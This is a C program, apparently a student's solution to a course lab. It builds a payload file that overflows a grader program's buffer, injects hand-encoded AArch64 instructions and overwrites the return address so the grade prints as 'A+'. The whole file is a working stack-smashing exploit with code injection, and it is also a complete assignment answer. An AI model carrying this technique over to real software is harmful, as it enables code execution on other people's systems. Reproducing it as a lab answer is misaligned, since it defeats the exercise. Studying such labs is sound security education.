/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Anish K                                                    */
/*--------------------------------------------------------------------*/
/*
  Produces a file called dataAplus. This file, when given to the grader
  program, causes the program to print "A+" as the grade. It does this by:
  
  1. Writing the attacker's chosen name ("AnishKKat") and a null terminator.
  2. Writing padding characters to overflow the buffer and overwrite saved 
     return addresses.
  3. Inserting an 'A' character (to print "A") followed by null bytes to align.
  4. Inserting instructions to:
     - Load address of 'A' char into x0 and branch-link to printf to print it.
     - Change the grade in memory from 'D' to '+' using MOV, ADR, and STRB.
     - Finally branch back to main’s print sequence to print the modified grade.

  Unlike the original code, we do not rely on a MiniAssembler_bl function.
  Instead, we implement a small helper function My_bl locally to create a BL
  instruction. Everything else remains similar in logic to the working code
  you provided. 
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* A helper function to produce a BL instruction. This is similar to what 
   MiniAssembler_b does, but sets the top bits for a BL instruction instead 
   of B. We cannot use MiniAssembler_bl (as it doesn't exist), so we do this inline. */
static unsigned int My_bl(unsigned long ulAddr, unsigned long ulAddrOfThisInstr) {
    unsigned int uiInstr = 0x94000000; /* Base opcode for BL */
    unsigned int uiOffset = (unsigned int)((ulAddr - ulAddrOfThisInstr) >> 2);
    uiInstr |= (uiOffset & 0x03FFFFFF);
    return uiInstr;
}

/*--------------------------------------------------------------------*/
/* main:
   - Accepts no command-line arguments.
   - Does not read from stdin.
   - Writes a carefully crafted sequence of bytes to "dataAplus".
   - Returns 0 on success.
*/
/*--------------------------------------------------------------------*/

int main(void)
{
    /* Attacker’s chosen name */
    const char *pcName = "AnishKKat";
    int i;
    unsigned long ulReturnAddr;
    unsigned int uiMovInstr;
    unsigned int uiAdrInstr;
    unsigned int uiStrbInstr;
    unsigned int uiBranchInstr;
    
    /* Open the dataAplus file for writing in binary mode */
    FILE *pFile = fopen("dataAplus", "w");
    if (!pFile) return 1; 

    /* Write the name and a null terminator to the file */
    /* "AnishKKat" is 9 characters, so we write 9 + 1 null = 10 bytes total */
    fwrite(pcName, 1, 9, pFile);
    fputc('\0', pFile);

    /* Write padding to overflow the stack. We use '0' characters as padding. 
       From the original known working code: 10 '0' chars for padding. */
    for (i = 0; i < 10; i++) {
        fputc('0', pFile);
    }

    /* Write 'A' character, which will be printed to achieve "A" part of "A+" */
    fputc('A', pFile);

    /* Write three null bytes for alignment and string termination */
    for (i = 0; i < 3; i++) {
        fputc('\0', pFile);
    }

    /* Now we insert instructions into the bss section:
       1) ADR x0, 0x42006c
          Loads the address (0x42006c) of the 'A' char into x0.
          This must align with our chosen memory layout. */
    uiMovInstr = MiniAssembler_adr(0, 0x42006c, 0x420070);
    fwrite(&uiMovInstr, sizeof(unsigned int), 1, pFile);

    /* 2) BL 0x400690
       Branch-link to printf (0x400690), which will print the 'A' char.
       We use My_bl since MiniAssembler_bl doesn't exist. */
    uiBranchInstr = My_bl(0x400690, 0x420074);
    fwrite(&uiBranchInstr, sizeof(unsigned int), 1, pFile);

    /* Next instructions to overwrite the grade:
       3) MOV w0, '+'
          Move '+' into w0, so we can store it into the grade variable. */
    uiMovInstr = MiniAssembler_mov(0, '+');
    fwrite(&uiMovInstr, sizeof(unsigned int), 1, pFile);

    /* 4) ADR x1, 0x420044
          x1 points to the grade variable (initially 'D'), so we can overwrite it. */
    uiAdrInstr = MiniAssembler_adr(1, 0x420044, 0x42007c);
    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, pFile);

    /* 5) STRB w0, [x1]
          Store the '+' character into the grade address, changing 'D' to '+'. */
    uiStrbInstr = MiniAssembler_strb(0, 1);
    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, pFile);

    /* 6) B 0x40089c
          Branch back to the main function area to continue execution, 
          which will now print out the newly formed "A+" grade. */
    uiBranchInstr = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&uiBranchInstr, sizeof(unsigned int), 1, pFile);

    /* Overwrite the stored return address in the stack with 0x420070,
       causing execution to jump into our injected instructions after 
       returning from the current function. */
    ulReturnAddr = 0x420070;
    fwrite(&ulReturnAddr, sizeof(unsigned long), 1, pFile);

    fclose(pFile);

    return 0;
}